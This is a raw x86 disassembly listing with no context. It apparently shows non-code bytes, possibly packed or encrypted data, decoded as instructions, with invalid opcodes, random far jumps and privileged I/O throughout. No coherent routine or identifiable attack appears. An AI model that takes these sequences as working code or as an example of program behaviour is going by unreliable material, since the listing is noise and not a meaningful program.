  4200ee:	cs mov eax,0x91852299
  4200f4:	lods   eax,DWORD PTR ds:[esi]
  4200f5:	pop    edi
  4200f6:	fild   QWORD PTR [ebp+0x34]
  4200f9:	jae    0x420098
  4200fb:	in     al,0x3e
  4200fd:	frstor [eax+ecx*8]
  420100:	sti    
  420101:	ins    DWORD PTR es:[edi],dx
  420102:	retf   0x3b21
  420105:	xchg   bh,dh
  420107:	mov    eax,0xdbcdd1ad
  42010c:	push   eax
  42010d:	inc    ebx
  42010e:	push   eax
  42010f:	mov    ch,0x48
  420111:	cmp    DWORD PTR [ecx+0x1dac33da],0x68c34fc2
  42011b:	(bad)  
  42011c:	arpl   si,si
  42011e:	pop    edx
  42011f:	push   eax
  420120:	sbb    ecx,DWORD PTR [edi]
  420122:	data16 stc 
  420124:	cwde   
  420125:	and    al,0x88
  420127:	scas   al,BYTE PTR es:[edi]
  420128:	inc    esi
  420129:	or     DWORD PTR [ebp+0x3fc05eee],eax
  42012f:	jo     0x4200c3
  420131:	push   ds
  420132:	pop    ecx
  420133:	inc    ebx
  420134:	or     edx,edx
  420136:	mov    al,ds:0x8bdacde1
  42013b:	and    BYTE PTR [edx-0x4e9d2e8b],cl
  420141:	cs dec ecx
  420143:	xor    eax,0x8afc6fb1
  420148:	dec    edi
  420149:	lea    esp,[edx]
  42014b:	mov    eax,DWORD PTR [eax]
  42014d:	pop    ecx
  42014e:	sub    al,BYTE PTR [ecx-0x5c]
  420151:	out    0x54,al
  420153:	dec    eax
  420154:	push   es
  420155:	test   al,0x36
  420157:	ds mov eax,0xd18a2aeb
  42015d:	sub    al,0xcd
  42015f:	xor    bh,BYTE PTR [ecx+ebx*4]
  420162:	mov    esi,0x1953fdc7
  420167:	jo     0x4201b9
  420169:	pop    esi
  42016a:	jb     0x42013d
  42016c:	hlt    
  42016d:	add    ebp,ecx
  42016f:	xor    DWORD PTR [ebx+0x70],esi
  420172:	push   cs
  420173:	lock sbb DWORD PTR [edi+eax*4+0x11],ebp
  420178:	adc    eax,0x756578e9
  42017d:	add    ebx,DWORD PTR [ecx-0x61]
  420180:	sub    DWORD PTR [esi+ebx*8-0x4003c0a0],esi
  420187:	imul   esi,DWORD PTR [ecx+0x32],0x58
  42018b:	sub    ecx,eax
  42018d:	imul   edx,DWORD PTR [eax],0xb
  420190:	jbe    0x420126
  420192:	xchg   ebx,eax
  420193:	fsubr  DWORD PTR [ebp-0x63a47151]
  420199:	xchg   ebp,eax
  42019a:	lods   eax,DWORD PTR ds:[esi]
  42019b:	and    BYTE PTR [edx-0x952869b],ch
  4201a1:	sahf   
  4201a2:	imul   esp,DWORD PTR [ebx-0xd8c783e],0x14214195
  4201ac:	push   edi
  4201ad:	out    0x6c,eax
  4201af:	cmc    
  4201b0:	iret   
  4201b1:	loope  0x42015c
  4201b3:	add    al,0xec
  4201b5:	shl    edx,1
  4201b7:	add    eax,ebx
  4201b9:	adc    DWORD PTR [edi+eiz*2+0x3],0xb1ba4c50
  4201c1:	jle    0x42022b
  4201c3:	xor    bh,BYTE PTR [ecx]
  4201c5:	push   0x78
  4201c7:	cmp    DWORD PTR [ebx],ebp
  4201c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201ca:	je     0x420215
  4201cc:	mov    eax,es:0x7af6f7e7
  4201d2:	add    ecx,DWORD PTR ds:0xe48c965b
  4201d8:	xchg   esi,eax
  4201d9:	out    dx,eax
  4201da:	push   eax
  4201db:	push   esp
  4201dc:	push   esi
  4201dd:	popf   
  4201de:	inc    ecx
  4201df:	push   ebx
  4201e1:	ja     0x4201bb
  4201e3:	jbe    0x420233
  4201e5:	std    
  4201e6:	jl     0x4201d2
  4201e8:	pop    ss
  4201e9:	(bad)  
  4201ea:	clc    
  4201eb:	mov    edx,0x5b0
	...
  420254:	add    BYTE PTR [eax],al
  420256:	jae    0x420227
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx-0x780cc0d7],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	mov    ebx,0xe20f789b
  420273:	and    esi,0x89e5f9a3
  420279:	retf   
  42027a:	dec    esp
  42027b:	lahf   
  42027c:	push   cs
  42027d:	lods   al,BYTE PTR ds:[esi]
  42027e:	cld    
  42027f:	xchg   ch,ch
  420281:	mov    edx,0x2d819d48
  420286:	adc    esi,ebp
  420288:	or     esp,DWORD PTR [edx+0x4d]
  42028b:	add    DWORD PTR [edi-0x79b07e6d],esp
  420291:	sahf   
  420292:	(bad)  
  420293:	jge    0x4202c9
  420295:	nop
  420296:	xor    esi,DWORD PTR [edx]
  420298:	xor    edi,ebx
  42029a:	stc    
  42029b:	lds    eax,FWORD PTR [edi+0x7]
  42029e:	enter  0xd0c9,0xd0
  4202a2:	retf   
  4202a3:	in     al,dx
  4202a4:	push   0x21ed0415
  4202a9:	push   0x72eae8ac
  4202ae:	xchg   ebp,eax
  4202af:	cmp    BYTE PTR [eax-0x61],al
  4202b2:	(bad)  
  4202b3:	cld    
  4202b4:	xchg   edx,eax
  4202b5:	mov    ebp,DWORD PTR [ebp-0x76]
  4202b8:	adc    edi,ebx
  4202ba:	stos   BYTE PTR es:[edi],al
  4202bb:	daa    
  4202bc:	call   0xfb82aba4
  4202c1:	xchg   ebx,eax
  4202c2:	loop   0x42030b
  4202c4:	or     BYTE PTR [eax],dh
  4202c6:	ss pop esp
  4202c8:	sbb    cl,BYTE PTR [ecx-0x7cfc2db9]
  4202ce:	jo     0x4202df
  4202d0:	xchg   ecx,eax
  4202d1:	and    DWORD PTR ds:0x79969900,edi
  4202d7:	outs   dx,DWORD PTR ds:[esi]
  4202d8:	or     ebp,DWORD PTR [edx]
  4202da:	pusha  
  4202db:	add    eax,0xc3f1ee7c
  4202e0:	sbb    ah,BYTE PTR [edx+0x66]
  4202e3:	mov    bl,0xb1
  4202e5:	repnz inc edx
  4202e7:	retf   0x4c5d
  4202ea:	cmp    ebp,eax
  4202ec:	xor    eax,0xa166512f
  4202f1:	shl    BYTE PTR [edx-0x358fe6d2],0x50
  4202f8:	in     al,0xfd
  4202fa:	icebp  
  4202fb:	adc    bl,BYTE PTR [esi]
  4202fd:	push   ecx
  4202fe:	in     eax,0x66
  420300:	out    0x1f,eax
  420302:	cli    
  420303:	shr    BYTE PTR [eax*1+0x43d7586b],cl
  42030a:	lods   al,BYTE PTR ds:[esi]
  42030b:	add    BYTE PTR [eax+ecx*2-0x2b95e226],dh
  420312:	adc    al,0x24
  420314:	call   0xf809:0x7de37f2b
  42031b:	mov    dh,0xf
  42031d:	sbb    dh,ah
  42031f:	mov    ch,0x77
  420321:	sbb    eax,0x113d73fc
  420326:	xchg   esi,eax
  420327:	and    esi,DWORD PTR [eax]
  420329:	iret   
  42032a:	mov    ebp,0xa741b24f
  42032f:	mov    ecx,ebx
  420331:	lds    esp,FWORD PTR [ebp+edx*1-0x63]
  420335:	jno    0x42034c
  420337:	cwde   
  420338:	aad    0xc
  42033a:	mov    ebx,?
  42033c:	push   cs
  42033d:	scas   al,BYTE PTR es:[edi]
  42033e:	jae    0x42034c
  420340:	sbb    eax,0x4e22e929
  420345:	add    eax,0x4d466bbe
  42034a:	mov    edi,0x8393af49
  42034f:	jg     0x4203af
  420351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420352:	gs cdq 
  420354:	jl     0x4202e0
  420356:	pop    edx
  420357:	dec    ecx
  420358:	xor    BYTE PTR ds:0xd3512721,0xd9
  42035f:	sbb    al,dh
  420361:	fcomp  DWORD PTR [esi]
  420363:	or     BYTE PTR [ebp-0x3b],ch
  420366:	jp     0x420393
  420368:	sub    dh,0x25
  42036b:	ja     0x420385
  42036d:	loopne 0x42036f
	...
  4203d3:	add    BYTE PTR [eax],al
  4203d5:	add    BYTE PTR [ecx+0x6],al
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	or     al,0xfc
  4203e4:	stos   BYTE PTR es:[edi],al
  4203e5:	cmp    DWORD PTR [edi+0x5a],esp
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	popf   
  4203ef:	in     eax,dx
  4203f0:	or     dl,BYTE PTR ss:[ecx]
  4203f3:	add    ebp,DWORD PTR [esi+ecx*4-0x3f]
  4203f7:	jl     0x420436
  4203f9:	jbe    0x420384
  4203fb:	pop    edi
  4203fc:	push   edx
  4203fd:	or     DWORD PTR [edx],esi
  4203ff:	add    DWORD PTR [edi],esp
  420401:	adc    ch,BYTE PTR [ebp+ebp*4-0x22]
  420405:	sbb    DWORD PTR [ebx-0x6f506d09],0x8c728c3c
  42040f:	push   es
  420410:	push   esp
  420411:	cmc    
  420412:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420414:	inc    eax
  420415:	(bad)  
  420416:	jmp    0x6be2:0x9103500d
  42041d:	jp     0x420408
  42041f:	mov    esp,DWORD PTR [eax]
  420421:	retf   
  420422:	loope  0x420470
  420424:	adc    cl,BYTE PTR [ebx+0x496e5714]
  42042a:	lock call 0x2b1a:0xbd4039ad
  420432:	fimul  DWORD PTR [esi-0xd]
  420435:	jne    0x420415
  420437:	mov    eax,0x3d196d64
  42043c:	(bad)  
  42043d:	sub    al,0xb
  42043f:	test   DWORD PTR [edi],edi
  420441:	mov    BYTE PTR [edx+0x5a],cl
  420444:	and    al,0xd0
  420446:	jae    0x420479
  420448:	popw   ss
  42044a:	cmp    al,0xb0
  42044c:	scas   eax,DWORD PTR es:[edi]
  42044d:	cmp    dl,dh
  42044f:	adc    al,0x4b
  420451:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  420453:	adc    BYTE PTR [edx+0x3e],ah
  420456:	or     al,0x60
  420458:	mov    ds:0x7827161b,eax
  42045d:	pop    es
  42045e:	inc    ebp
  42045f:	pop    edx
  420460:	cmp    BYTE PTR [edi-0x13ec4e8e],0x30
  420467:	mov    ds,edi
  420469:	add    DWORD PTR [edx-0x351e3be3],0x7417d898
  420473:	push   ebp
  420474:	lock loopne 0x4203f9
  420477:	push   es
  420478:	mov    ds:0x1c3b0a7d,eax
  42047d:	pop    esi
  42047e:	into   
  42047f:	in     al,0x4c
  420481:	sahf   
  420482:	xor    edx,edx
  420484:	xchg   edx,eax
  420485:	ret    0xe5d2
  420488:	icebp  
  420489:	scas   al,BYTE PTR es:[edi]
  42048a:	ins    BYTE PTR es:[edi],dx
  42048b:	dec    esi
  42048c:	mov    edx,0x65c67300
  420491:	inc    esp
  420492:	jl     0x42046f
  420494:	push   edi
  420495:	push   ds
  420496:	out    dx,al
  420497:	or     DWORD PTR ds:0xad960c8f,esi
  42049d:	or     BYTE PTR [edi+eax*1],bl
  4204a0:	xor    BYTE PTR [eax],dh
  4204a2:	push   ds
  4204a3:	scas   al,BYTE PTR es:[edi]
  4204a4:	pop    ebp
  4204a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204a6:	jae    0x42048e
  4204a8:	stos   BYTE PTR es:[edi],al
  4204a9:	repz loop 0x42051c
  4204ac:	inc    ebx
  4204ad:	pop    eax
  4204ae:	clc    
  4204af:	test   BYTE PTR [edx-0x14],0x87
  4204b3:	adc    al,0x14
  4204b5:	shr    DWORD PTR [edx],cl
  4204b7:	jae    0x4204b8
  4204b9:	into   
  4204ba:	xchg   edx,eax
  4204bb:	ret    0x1c36
  4204be:	add    eax,0xee24959d
  4204c3:	fmul   DWORD PTR [esi+edi*1]
  4204c6:	imul   ebp,eax,0x3a
  4204c9:	mov    ecx,0x146fc776
  4204ce:	test   eax,0x7cc3d01f
  4204d3:	pop    ds
  4204d4:	shl    BYTE PTR es:[di-0x6128],1
  4204da:	cmp    cl,BYTE PTR [esi+0x13]
  4204dd:	(bad)  
  4204de:	gs (bad) 
  4204e1:	icebp  
  4204e2:	das    
  4204e3:	outs   dx,DWORD PTR ds:[esi]
  4204e4:	mov    ds:0x8eef02ba,al
  4204e9:	mov    edi,0x4225024
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	jno    0x42059d
  420564:	gs push ebx
  420566:	addr16 pop ebx
  420568:	add    DWORD PTR [eax],eax
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	fwait
  42056f:	sbb    DWORD PTR [edx],edx
  420571:	in     eax,0x38
  420573:	jge    0x420519
  420575:	bound  ecx,QWORD PTR [edx+0x17]
  420578:	dec    eax
  420579:	pop    ds
  42057a:	mov    DWORD PTR [ecx-0x77],ebx
  42057d:	jge    0x42059b
  42057f:	adc    al,0x12
  420581:	mov    al,ds:0x13ecf5f8
  420586:	push   edi
  420587:	rcr    edi,1
  420589:	shr    BYTE PTR [edx+0x7e157b1d],1
  42058f:	adc    BYTE PTR [edx+0xc],bl
  420592:	inc    edi
  420593:	data16 jb 0x420587
  420596:	enter  0xf26e,0x9c
  42059a:	inc    esi
  42059b:	ror    BYTE PTR [eax],cl
  42059d:	(bad)  
  42059e:	in     eax,0x47
  4205a0:	sbb    al,0x6
  4205a2:	pusha  
  4205a3:	sahf   
  4205a4:	xor    edx,eax
  4205a6:	mov    edi,0xf2119680
  4205ab:	or     ah,ah
  4205ad:	cmp    al,BYTE PTR [edx+ebp*2-0x5f73132b]
  4205b4:	daa    
  4205b5:	fadd   st(0),st
  4205b7:	call   0x3f8d3f0a
  4205bc:	aad    0x8f
  4205be:	push   DWORD PTR [ecx]
  4205c0:	add    ecx,edx
  4205c2:	jbe    0x4205a6
  4205c4:	add    al,0x8f
  4205c6:	sahf   
  4205c7:	dec    ecx
  4205c8:	cmp    al,0xa8
  4205ca:	cmc    
  4205cb:	add    al,0x34
  4205cd:	hlt    
  4205ce:	mov    ds:0x77e19712,al
  4205d3:	hlt    
  4205d4:	mov    bl,0x9b
  4205d6:	jl     0x4205b4
  4205d8:	push   ecx
  4205d9:	sub    eax,0x8b411f4d
  4205de:	call   0x91c39003
  4205e3:	pop    ecx
  4205e4:	cmp    bl,BYTE PTR [eax+0x416f4f48]
  4205ea:	push   esi
  4205eb:	lds    ebp,FWORD PTR [ebp-0x24ff6cf1]
  4205f1:	or     al,0x70
  4205f3:	push   esi
  4205f4:	cmp    cl,BYTE PTR [ebp-0x4b]
  4205f7:	or     DWORD PTR [edx+0x654137e4],esi
  4205fd:	mov    ch,ch
  4205ff:	cmp    al,0x8f
  420601:	pop    DWORD PTR [ecx]
  420603:	xchg   ebx,eax
  420604:	sub    eax,0x27c87052
  420609:	sbb    ch,dl
  42060b:	push   cs
  42060c:	cmp    DWORD PTR [ecx],eax
  42060e:	loopne 0x420673
  420610:	inc    edi
  420611:	push   edx
  420612:	test   eax,0xe85edf48
  420617:	cwde   
  420618:	mov    ebx,0x715612bf
  42061d:	cmp    BYTE PTR [edx],0x80
  420620:	daa    
  420621:	push   ebx
  420622:	sub    al,0x28
  420624:	mov    ah,0xd6
  420626:	(bad)  
  420627:	scas   eax,DWORD PTR es:[edi]
  420628:	popa   
  420629:	push   esi
  42062a:	inc    ebp
  42062b:	push   ebp
  42062c:	and    BYTE PTR [eax+ebx*8+0x3464d394],0x13
  420634:	mov    dl,0xcb
  420636:	in     eax,dx
  420637:	sar    BYTE PTR [eax+0x64],0xbe
  42063b:	dec    ecx
  42063c:	stos   DWORD PTR es:[edi],eax
  42063d:	lahf   
  42063e:	mov    esp,0xd4a9d9b8
  420643:	cli    
  420644:	adc    BYTE PTR [edx+0x7b],bh
  420647:	out    0x86,al
  420649:	xchg   cl,bh
  42064b:	xchg   WORD PTR [edx-0xc54ddb1],bx
  420652:	jp     0x420613
  420654:	(bad)  
  420655:	push   ebx
  420656:	push   ds
  420657:	inc    edi
  420658:	lock xchg ebx,eax
  42065a:	mov    WORD PTR [edi+ebp*1-0x34cdbb15],?
  420661:	fdiv   st,st(4)
  420663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420664:	mov    esi,0x5219bd28
  420669:	cmp    al,0x97
  42066b:	sub    al,0x54
  42066d:	pushf  
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	mov    edi,edi
  4206e4:	ficom  WORD PTR [edx+0x15c67]
  4206ea:	add    BYTE PTR [ecx],al
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	sub    ecx,DWORD PTR [edx+0xaf3176a]
  4206f4:	add    al,0xb1
  4206f6:	cli    
  4206f7:	and    al,0x38
  4206f9:	leave  
  4206fa:	push   esp
  4206fb:	cmp    al,0x1a
  4206fd:	push   edx
  4206fe:	mov    ebp,0x133d6db3
  420703:	int    0x58
  420705:	pop    ecx
  420706:	lahf   
  420707:	inc    eax
  420708:	ret    
  420709:	jge    0x4206a8
  42070b:	xor    bh,ah
  42070d:	mov    edx,0xd9981a38
  420712:	xor    ch,0x59
  420715:	fs xchg edi,eax
  420717:	mov    eax,es:0x775e1e5d
  42071d:	sbb    al,0x73
  42071f:	cld    
  420720:	dec    ebx
  420721:	inc    edx
  420722:	mov    ebp,0x80880c69
  420727:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  420729:	retf   0x4976
  42072c:	cdq    
  42072d:	mov    ebx,0x7395dee0
  420732:	xcrypt-cbc (bad)
  420733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420734:	push   edx
  420735:	push   esi
  420736:	sbb    bl,BYTE PTR [edx+0x60]
  420739:	inc    esi
  42073a:	mov    esp,ebx
  42073c:	retf   
  42073d:	icebp  
  42073e:	lds    esp,FWORD PTR [edx-0x1b]
  420741:	fst    DWORD PTR [edi]
  420743:	(bad)  
  420744:	xlat   BYTE PTR ds:[ebx]
  420745:	and    eax,0x6c35102a
  42074a:	iret   
  42074b:	cdq    
  42074c:	leave  
  42074d:	mov    ah,0x77
  42074f:	enter  0x3b83,0xb
  420753:	push   ds
  420754:	test   eax,0xdb0fc70d
  420759:	scas   al,BYTE PTR es:[edi]
  42075a:	add    BYTE PTR [edx+0x15],cl
  42075d:	(bad)  
  42075e:	fsincos 
  420760:	iret   
  420761:	inc    edx
  420762:	mov    bl,0xed
  420764:	inc    esp
  420765:	pushf  
  420766:	pop    edi
  420767:	xor    esi,edx
  420769:	and    eax,0x8e5defd6
  42076e:	sbb    al,0x63
  420770:	cmp    al,0xef
  420772:	inc    ebx
  420773:	add    BYTE PTR [eax+0x19],dh
  420776:	cwde   
  420777:	sahf   
  420778:	mov    esi,0x304b648f
  42077d:	call   DWORD PTR [edi]
  42077f:	mov    DWORD PTR [ecx],ebp
  420781:	popa   
  420782:	mov    bl,0xad
  420784:	in     eax,0x69
  420786:	add    eax,0x4ec6128e
  42078b:	jo     0x420802
  42078d:	and    esp,DWORD PTR [ebx-0x56d442a3]
  420793:	(bad)  
  420794:	mov    ecx,0xab709dff
  420799:	outs   dx,DWORD PTR ds:[esi]
  42079a:	scas   eax,DWORD PTR es:[edi]
  42079b:	jns    0x4207f3
  42079d:	push   edx
  42079e:	ss cwde 
  4207a0:	xchg   BYTE PTR [ecx+0x43],bh
  4207a3:	cmp    ebx,eax
  4207a5:	fadd   st(2),st
  4207a7:	scas   eax,DWORD PTR es:[edi]
  4207a8:	push   eax
  4207a9:	and    dh,BYTE PTR [eax-0x11f180f2]
  4207af:	call   0xa21555df
  4207b4:	jg     0x420752
  4207b6:	inc    esp
  4207b7:	popf   
  4207b8:	call   0x5484:0x8e702ab6
  4207bf:	xabort 0x41
  4207c2:	lods   eax,DWORD PTR ds:[esi]
  4207c3:	inc    ebx
  4207c4:	push   edx
  4207c5:	loopne 0x420757
  4207c7:	into   
  4207c8:	mov    eax,ds:0xad1ab140
  4207cd:	or     eax,0x309d6f03
  4207d2:	es in  al,0x31
  4207d5:	les    ecx,FWORD PTR [edx-0x23c2add]
  4207db:	xchg   ebp,eax
  4207dc:	mov    dl,BYTE PTR [eax+0x7]
  4207df:	jmp    0x808228dd
  4207e4:	add    DWORD PTR [edx],esi
  4207e6:	pop    eax
  4207e7:	adc    esi,ebp
  4207e9:	(bad)
  4207ed:	ret    
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	fld    TBYTE PTR [edx+0x32]
  420865:	mov    ch,0x67
  420867:	pop    ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	xor    al,BYTE PTR [ebp+0xc]
  420871:	aaa    
  420872:	pop    ss
  420873:	fs js  0x420871
  420876:	sub    dh,bh
  420878:	not    BYTE PTR [eax+0x57]
  42087b:	pop    edx
  42087c:	sub    ecx,DWORD PTR [ecx-0xb3d5f78]
  420882:	lock or eax,0xe8cc762c
  420888:	loope  0x420856
  42088a:	imul   esi,DWORD PTR [edx-0x5cd099f7],0x7ce78389
  420894:	(bad)  
  420895:	clc    
  420896:	ds cdq 
  420898:	xchg   eax,eax
  42089a:	push   esp
  42089b:	adc    eax,0x328248bd
  4208a0:	mov    bl,0xc3
  4208a2:	add    ebp,ecx
  4208a4:	add    esp,ebp
  4208a6:	aaa    
  4208a7:	mov    al,ds:0xa843c3f2
  4208ac:	ja     0x420855
  4208ae:	jno    0x420830
  4208b0:	not    bh
  4208b2:	mov    al,ds:0x49c7b9a3
  4208b7:	js     0x4208dd
  4208b9:	cs ds nop
  4208bc:	retf   
  4208bd:	stc    
  4208be:	outs   dx,BYTE PTR ds:[esi]
  4208bf:	dec    eax
  4208c0:	packssdw mm3,QWORD PTR [eax-0x53]
  4208c4:	scas   eax,DWORD PTR es:[edi]
  4208c5:	inc    edx
  4208c6:	sbb    eax,0x6281417
  4208cb:	leave  
  4208cc:	into   
  4208cd:	inc    ebx
  4208ce:	sti    
  4208cf:	test   ebx,0xbd2c7860
  4208d5:	push   es
  4208d6:	jb     0x4208f9
  4208d8:	lea    ebp,[edx-0x6c3aa2ac]
  4208de:	push   esi
  4208df:	into   
  4208e0:	sub    DWORD PTR [ecx-0x60],esi
  4208e3:	mov    ebx,0xb76bfe8d
  4208e8:	cmp    BYTE PTR [eax-0x56743d77],cl
  4208ee:	in     al,0x84
  4208f0:	mov    DWORD PTR [esi+0x3eea5a6d],esi
  4208f6:	sahf   
  4208f7:	shr    BYTE PTR [esi],cl
  4208f9:	ss fs popf 
  4208fc:	stc    
  4208fd:	cwde   
  4208fe:	mov    ebp,DWORD PTR [ebp-0x30]
  420901:	push   0xd01ad2d0
  420906:	cmp    eax,0x4e4b01d2
  42090b:	jno    0x4208e3
  42090d:	hlt    
  42090e:	test   BYTE PTR [edi-0x2a],dh
  420911:	adc    eax,0xb15771da
  420916:	inc    edi
  420917:	mov    eax,ds:0xbcdedf91
  42091c:	lds    ecx,FWORD PTR es:[edx-0x6e]
  420920:	mov    BYTE PTR [eax-0x73741e40],bh
  420926:	inc    ecx
  420927:	(bad)  
  420928:	xchg   esi,eax
  420929:	test   BYTE PTR [edx+0x22],dl
  42092c:	stos   DWORD PTR es:[edi],eax
  42092d:	or     al,BYTE PTR [ebx-0x56]
  420930:	loopne 0x420923
  420932:	popa   
  420933:	arpl   bx,bp
  420935:	push   edi
  420936:	cmc    
  420937:	xchg   ebx,eax
  420938:	test   al,0x21
  42093a:	mov    dl,BYTE PTR [ebp-0x35]
  42093d:	mov    ecx,?
  42093f:	pop    es
  420940:	mov    dl,0xdf
  420942:	shl    dl,0x6e
  420945:	lock push ss
  420947:	and    ebx,DWORD PTR [edx]
  420949:	xchg   edi,eax
  42094a:	fist   WORD PTR [ecx]
  42094c:	(bad)  
  42094d:	mov    cl,0xaa
  42094f:	in     al,0xc0
  420951:	adc    eax,0x6442b808
  420956:	in     eax,0xee
  420958:	add    dl,BYTE PTR ds:0xe48b18d
  42095f:	cwde   
  420960:	fadd   QWORD PTR [edx+0x66]
  420963:	add    DWORD PTR [eax-0x72c500cd],esi
  420969:	xchg   esi,eax
  42096a:	enterw 0x912b,0x0
	...
  4209d3:	add    BYTE PTR [eax],al
  4209d5:	add    ah,bl
  4209d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209d8:	jae    0x420a27
  4209da:	jnp    0x4209bb
  4209dc:	(bad)  
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x1a
  4209e3:	xlat   BYTE PTR ds:[ebx]
  4209e4:	ror    BYTE PTR [eax+0x15e67],1
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	les    esi,FWORD PTR [esi]
  4209f0:	popf   
  4209f1:	in     eax,0xef
  4209f3:	sahf   
  4209f4:	test   eax,0xce81a37c
  4209f9:	and    al,0x90
  4209fb:	je     0x4209e6
  4209fd:	jmp    0x88756e9d
  420a02:	dec    edi
  420a03:	sbb    BYTE PTR [esp+eax*1+0x3b],dl
  420a07:	(bad)  
  420a08:	dec    esi
  420a09:	and    eax,DWORD PTR [ebx+0x43]
  420a0c:	nop
  420a0d:	ret    0x39f1
  420a10:	je     0x4209a2
  420a12:	outs   dx,DWORD PTR ds:[esi]
  420a13:	mov    ecx,0x8b8dc3d0
  420a18:	sahf   
  420a19:	sbb    cl,dh
  420a1b:	arpl   WORD PTR [ecx-0x6c8284e1],sp
  420a21:	xchg   ebp,eax
  420a22:	pushf  
  420a23:	or     dh,BYTE PTR [eax+0x7e24f66b]
  420a29:	fisub  DWORD PTR [ebp+0x16]
  420a2c:	jge    0x4209d1
  420a2e:	in     al,0xa5
  420a30:	jl     0x420a16
  420a32:	dec    ecx
  420a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a34:	cwde   
  420a35:	in     eax,dx
  420a36:	jno    0x4209e2
  420a38:	pop    ebp
  420a39:	jmp    0xcd87:0xff3ec057
  420a40:	or     eax,0xde8dbf84
  420a45:	or     dl,0xa5
  420a48:	mov    edi,es
  420a4a:	test   al,0xeb
  420a4c:	cmp    dh,BYTE PTR [eax-0x1d]
  420a4f:	jae    0x420ac0
  420a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a52:	outs   dx,DWORD PTR ds:[esi]
  420a53:	jne    0x420a02
  420a55:	or     eax,0x95026352
  420a5a:	inc    ecx
  420a5b:	sub    DWORD PTR [ecx+0x5723baef],ebp
  420a61:	mov    cl,0x41
  420a63:	pop    esp
  420a64:	stos   DWORD PTR es:[edi],eax
  420a65:	daa    
  420a66:	daa    
  420a67:	clc    
  420a68:	dec    esp
  420a69:	mov    ebx,0xe6822344
  420a6e:	aas    
  420a6f:	rol    DWORD PTR [edi],1
  420a71:	aad    0xe7
  420a73:	xchg   ebx,eax
  420a74:	rcr    DWORD PTR [edi-0x25325c8],cl
  420a7a:	ins    DWORD PTR es:[edi],dx
  420a7b:	cmp    dl,BYTE PTR [esi+0x7342426d]
  420a81:	add    al,al
  420a83:	jnp    0x420ac7
  420a85:	call   0xd23d:0x177d691f
  420a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a8d:	jecxz  0x420b0e
  420a8f:	pop    eax
  420a90:	and    al,0xcc
  420a92:	ror    DWORD PTR ss:[ebx],cl
  420a95:	mov    edx,0xc9df65aa
  420a9a:	jmp    0x6eb7ff64
  420a9f:	jb     0x420a85
  420aa1:	lea    edi,[eax-0x6693050a]
  420aa7:	sub    eax,0x1b6eb998
  420aac:	add    BYTE PTR [ebp-0x33],bh
  420aaf:	xchg   edi,eax
  420ab0:	repz arpl WORD PTR [esi+ebx*8+0x60],bx
  420ab5:	fisubr DWORD PTR [ecx+0x5f56dd05]
  420abb:	in     eax,dx
  420abc:	fnsave [edx]
  420abe:	mov    bl,0x94
  420ac0:	(bad)  
  420ac1:	ins    DWORD PTR es:[edi],dx
  420ac2:	pop    edi
  420ac3:	call   0x8ad2:0x6388f46f
  420aca:	sub    BYTE PTR [ecx+0x79e6c2c9],dh
  420ad0:	repz jbe 0x420b3c
  420ad3:	pop    edx
  420ad4:	adc    DWORD PTR [esi+0x5080d52f],ebp
  420ada:	dec    ecx
  420adb:	push   es
  420adc:	pushf  
  420add:	cmp    bh,ch
  420adf:	dec    esp
  420ae0:	jae    0x420b1f
  420ae2:	lds    edx,FWORD PTR [ecx]
  420ae4:	pushf  
  420ae5:	ffree  st(3)
  420ae7:	cld    
  420ae8:	mov    eax,ds:0x61396d0
  420aed:	lods   eax,DWORD PTR ds:[esi]
	...
  420b56:	fbstp  TBYTE PTR [edx]
  420b58:	scas   eax,DWORD PTR es:[edi]
  420b59:	adc    ebp,edi
  420b5b:	lahf   
  420b5c:	(bad)  
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	push   ebx
  420b63:	leave  
  420b64:	lods   eax,DWORD PTR ds:[esi]
  420b65:	xor    eax,0x15f67
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	push   esi
  420b6f:	int3   
  420b70:	retf   0x80f5
  420b73:	stos   BYTE PTR es:[edi],al
  420b74:	(bad)  
  420b75:	xor    BYTE PTR [ebp+0x64],bl
